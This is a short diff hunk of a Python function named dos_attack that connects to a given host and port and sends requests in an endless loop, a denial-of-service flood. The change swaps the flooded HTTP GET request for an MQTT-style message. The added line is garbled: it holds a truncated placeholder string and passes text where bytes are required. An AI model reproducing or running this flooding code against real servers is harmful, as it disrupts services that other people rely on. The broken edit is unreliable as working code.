@@ -21,7 +21,8 @@ def dos_attack(host,port):
     with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as sock:
         sock.connect((host,port))
         while True:
-            sock.sendall(b"GET / HTTP/1.1\r\n\r\n")
+            message = f"MQTT_MESSAGE\......"
+            sock.sendall(message)
 
 #if __name__=="__main__":
 
